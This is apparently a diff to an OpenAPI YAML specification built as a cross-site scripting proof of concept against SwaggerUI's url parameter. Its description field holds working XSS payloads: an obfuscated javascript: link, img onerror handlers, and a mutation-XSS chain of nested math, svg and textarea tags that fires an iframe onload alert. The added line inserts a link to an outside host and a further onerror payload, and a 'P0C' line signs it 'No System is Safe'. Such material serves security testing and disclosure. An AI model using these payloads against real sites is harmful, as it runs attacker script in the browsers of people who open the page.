@@ -3,5 +3,5 @@ openapi: "3.0.0"
 info:
   title: SwaggerUI url parameter
   description:
-    <h4>xss<a href="java%0d%0ascript%0d%0a:alert()">Please</a>"/><img src="x" onerror=prompt(0)><math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math></h4>
+    <h4>xss<a href="https://mzl0y1cm.x1.pe">Please</a>"/><style><style /><img src=x onerror=alert(1)><img src="x" onerror=prompt(0)><math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math></h4>
     P0C<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(`No System is Safe`)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
